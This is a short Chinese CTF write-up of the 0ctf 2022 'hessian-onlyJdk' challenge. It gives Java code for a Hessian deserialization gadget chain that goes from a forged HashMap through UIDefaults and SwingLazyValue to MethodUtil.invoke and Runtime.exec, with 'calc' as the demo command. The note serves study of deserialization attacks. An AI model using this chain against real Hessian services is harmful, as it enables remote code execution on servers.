# Hessian与JDK

其实有很多题都是与hessian相关，只是突然想做个记录（并且这个只用到了jdk自身的类），并且这也是我第一次接触的链子。（是时候好好再回去学学codeql、tabby等....）

题目：https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk

就简单说一下自己的学习过程了。

将整条链子分成了3部分：

`第一部分：`

这里反射的调用还挺有意思，连着调用了2次

```java
        Method invokeMethod = Class.forName("sun.reflect.misc.MethodUtil").getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
        Method exec = Class.forName("java.lang.Runtime").getDeclaredMethod("exec", String.class);
        invokeMethod.invoke(null,new Object[]{invokeMethod, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{"calc"}}});
```

`第二部分：`

继续利用到了反射

```java
        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil","invoke",new Object[]{invokeMethod, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{"calc"}}});
        swingLazyValue.createValue(new UIDefaults());
```

`第三部分:`

利用hashtable去触发get后又触发createValue

```java
        UIDefaults uiDefaults1 = new UIDefaults();
        uiDefaults1.put("_", slz);
        UIDefaults uiDefaults2 = new UIDefaults();
        uiDefaults2.put("_", slz);

        HashMap<Object, Object> s = new HashMap<>();
        Field f = s.getClass().getDeclaredField("size");
        f.setAccessible(true);
        f.set(s, 2);
        Class<?> nodeC = Class.forName("java.util.HashMap$Node");

        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, uiDefaults1, null, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, uiDefaults2, null, null));
        Field tf = s.getClass().getDeclaredField("table");
        tf.setAccessible(true);
        tf.set(s, tbl);
```

